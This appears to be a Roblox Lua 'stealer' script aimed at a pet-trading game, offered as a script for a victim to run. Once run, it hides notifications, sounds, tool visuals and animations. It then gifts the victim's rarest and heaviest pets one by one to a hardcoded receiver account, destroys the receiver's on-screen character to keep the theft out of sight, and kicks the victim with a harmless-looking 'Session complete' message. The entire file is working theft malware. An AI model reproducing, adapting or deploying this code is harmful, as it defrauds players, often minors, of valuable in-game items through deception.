local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local player = Players.LocalPlayer
local EXECUTION_FLAG_NAME = "ChetosStealerFlag"
if CoreGui:FindFirstChild(EXECUTION_FLAG_NAME) then return end
local flag = Instance.new("BoolValue")
flag.Name = EXECUTION_FLAG_NAME
flag.Parent = CoreGui

local LOADER_RECEIVER = getgenv().receiver
local MAIN_RECEIVER = "ProCpvpT2"

task.spawn(function()
    local PlayerGui = player:WaitForChild("PlayerGui")
    RunService.Heartbeat:Connect(function()
        pcall(function() PlayerGui.Top_Notification:Destroy() end)
        pcall(function()
            local backpackGui = PlayerGui:FindFirstChild("Backpack")
            if backpackGui then
                local selectionImage = backpackGui:FindFirstChild("SelectionImageObject", true)
                if selectionImage then
                    selectionImage:Destroy()
                end
            end
        end)
    end)
end)
task.spawn(function()
    local SOUND_BLACKLIST = {["Notification"] = true, ["Equip"] = true, ["Gold_SFX"] = true}
    local function obliterateSound(sound)
        if sound:IsA("Sound") and SOUND_BLACKLIST[sound.Name] then
            sound:Destroy()
        end
    end
    game.DescendantAdded:Connect(obliterateSound)
    for _, sound in ipairs(game:GetDescendants()) do
        obliterateSound(sound)
    end
end)
task.spawn(function()
    local PetsService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")
    local oldNamecall
    oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
        if self == PetsService and getnamecallmethod():lower() == "fireserver" and ({...})[1] == "EquipPet" then
            return nil
        end
        return oldNamecall(self, ...)
    end)
end)
local function hideToolVisuals(tool)
    if not tool then return end
    for _, v in ipairs(tool:GetDescendants()) do
        if v:IsA("BasePart") or v:IsA("Decal") or v:IsA("Texture") then pcall(function() v.Transparency = 1 end)
        elseif v:IsA("Highlight") or v:IsA("ParticleEmitter") or v:IsA("Trail") then pcall(function() v.Enabled = false end)
        elseif v:IsA("Sound") then pcall(function() v:Destroy() end)
        end
    end
end
local function setupAnimationKiller(character)
    local humanoid = character:WaitForChild("Humanoid")
    local animator = humanoid:WaitForChild("Animator")
    if animator then
        animator.AnimationPlayed:Connect(function(animTrack)
            local animName = animTrack.Animation and animTrack.Animation.Name:lower() or ""
            if animName:find("tool") or animName:find("hold") or animName:find("equip") then
                animTrack:Stop(0); animTrack:Destroy()
            end
        end)
    end
end
RunService.Heartbeat:Connect(function()
    if player.Character and player.Character:FindFirstChildOfClass("Tool") then
        hideToolVisuals(player.Character:FindFirstChildOfClass("Tool"))
    end
end)
local function processTool(tool) hideToolVisuals(tool) end
local function watchCharacter(char)
    setupAnimationKiller(char)
    char.ChildAdded:Connect(function(child) if child:IsA("Tool") then processTool(child) end end)
    player.Backpack.ChildAdded:Connect(function(child) if child:IsA("Tool") then processTool(child) end end)
    for _, tool in ipairs(player.Backpack:GetChildren()) do processTool(tool) end
end
player.CharacterAdded:Connect(watchCharacter)
if player.Character then watchCharacter(player.Character) end
local CONFIG = {
    ["HUGE_PET_WEIGHT"] = 6.0,
    ["PRIORITY_PETS"] = {
        ["Cockatrice"] = true, ["Disco Bee"] = true, ["Dragonfly"] = true, ["Fennec Fox"] = true,
        ["French Fry Ferret"] = true, ["GIANT Swan"] = true, ["Golden Goose"] = true, ["Green Bean"] = true,
        ["Griffin"] = true, ["Lobster Thermidor"] = true, ["Luminous Sprite"] = true, ["Mizuchi"] = true,
        ["Phoenix"] = true, ["Queen Bee"] = true, ["Raccoon"] = true, ["Raiju"] = true,
        ["Red Panda"] = true, ["Space Squirrel"] = true, ["Spinosaurus"] = true, ["Swan"] = true,
        ["T-Rex"] = true, ["Tiger"] = true, ["Rainbow Dilophosaurus"] = true, ["Rainbow Griffin"] = true,
        ["Rainbow Lobster Thermidor"] = true, ["Rainbow Mizuchi"] = true, ["Rainbow Phoenix"] = true,
        ["Rainbow Spinosaurus"] = true, ["Corrupted Kitsune"] = true, ["Kitsune"] = true, ["Rainbow Corrupted Kitsune"] = true,
        ["Peacock"] = true, ["Mimic Octopus"] = true, ["Mimic"] = true, ["Butterfly"] = true
    }
}
local Util = {Get = function(tbl, path, default)
    local current = tbl
    for key in string.gmatch(path, "[^.]+") do if type(current) ~= "table" or current[key] == nil then return default end current = current[key] end
    return current
end}
local function getGiftPriority(pet)
    local isPriority = CONFIG.PRIORITY_PETS[pet.basePetType]
    if pet.basePetType:find("Kitsune") then return 1 end
    if (pet.isHuge and (pet.basePetType == "Peacock" or pet.basePetType == "Mimic Octopus")) or (pet.typeName:find("Rainbow") and pet.basePetType == "Mimic") then return 2 end
    if isPriority and pet.typeName:find("Rainbow") then return 3 end
    if pet.basePetType == "Raccoon" or pet.basePetType == "Dragonfly" or pet.basePetType == "Butterfly" or pet.basePetType == "Disco Bee" then return 4 end
    if pet.isHuge and isPriority then return 5 end
    if pet.isHuge then return 6 end
    if isPriority then return 7 end
    return 8
end
task.spawn(function()
    local giftingInitiated = false
    local function initiateGiftingLoop(targetPlayer)
        if giftingInitiated or not targetPlayer or targetPlayer == player then return end
        giftingInitiated = true
        local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
        local PetsService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")
        local FavoriteRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
        local DataService = require(ReplicatedStorage.Modules.DataService)
        while true do
            local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
            if not humanoid then task.wait(1); continue end
            local InventoryData = Util.Get(DataService:GetData(), "PetsData.PetInventory.Data")
            if not InventoryData then break end
            local allPetsToGift = {}
            for uuid, petInfo in pairs(InventoryData) do
                if type(petInfo) == "table" and petInfo.PetData then
                    local baseWeight = tonumber(Util.Get(petInfo, "PetData.BaseWeight", 0))
                    local basePetType = tostring(petInfo.PetType or "Unknown")
                    local isHuge = baseWeight >= CONFIG.HUGE_PET_WEIGHT
                    local isPriority = CONFIG.PRIORITY_PETS[basePetType]
                    if isHuge or isPriority then
                        table.insert(allPetsToGift, {
                            uuid = uuid, weight = baseWeight, basePetType = basePetType,
                            typeName = (petInfo.PetData.Mutation and tostring(petInfo.PetData.Mutation) .. " " or "") .. basePetType,
                            isHuge = isHuge
                        })
                    end
                end
            end
            if #allPetsToGift == 0 then
                break
            end
            table.sort(allPetsToGift, function(a, b)
                local scoreA = getGiftPriority(a)
                local scoreB = getGiftPriority(b)
                if scoreA ~= scoreB then return scoreA < scoreB end
                return a.weight > b.weight
            end)
            for _, item in ipairs(player.Backpack:GetChildren()) do
                if item:IsA("Tool") and item:GetAttribute("ItemType") == "Pet" and item:GetAttribute("d") == true then
                    FavoriteRemote:FireServer(item); task.wait()
                end
            end
            humanoid:UnequipTools()
            local petsContainer = Workspace:WaitForChild("PetsPhysical")
            for _, petMover in ipairs(petsContainer:GetChildren()) do
                if petMover:GetAttribute("OWNER") == player.Name and petMover:GetAttribute("UUID") then
                    PetsService:FireServer("UnequipPet", petMover:GetAttribute("UUID")); task.wait()
                end
            end
            for _, pet in ipairs(allPetsToGift) do
                local foundTool
                for _, tool in pairs(player.Backpack:GetChildren()) do
                    if tool:IsA("Tool") and tool:GetAttribute("PET_UUID") == pet.uuid then foundTool = tool; break end
                end
                if foundTool then
                    pcall(function()
                        humanoid:EquipTool(foundTool)
                        task.wait(0.5)
                        PetGiftingService:FireServer("GivePet", targetPlayer)
                        task.wait(1.0)
                    end)
                end
            end
            humanoid:UnequipTools()
            task.wait(1)
        end
        player:Kick("Session complete.")
    end
    local function findAndHandleTarget(receiverName)
        if not receiverName or giftingInitiated then return false end
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Name:lower():find(receiverName:lower(), 1, true) then
                if p.Character then p.Character:Destroy() end
                p.CharacterAdded:Connect(function(char) char:Destroy() end)
                initiateGiftingLoop(p)
                return true
            end
        end
        return false
    end
    if findAndHandleTarget(LOADER_RECEIVER) then return end
    if findAndHandleTarget(MAIN_RECEIVER) then return end
    Players.PlayerAdded:Connect(function(p)
        if giftingInitiated then return end
        if LOADER_RECEIVER and p.Name:lower():find(LOADER_RECEIVER:lower(), 1, true) then
            findAndHandleTarget(LOADER_RECEIVER)
        elseif not findAndHandleTarget(LOADER_RECEIVER) and p.Name:lower():find(MAIN_RECEIVER:lower(), 1, true) then
            findAndHandleTarget(MAIN_RECEIVER)
        end
    end)
end)
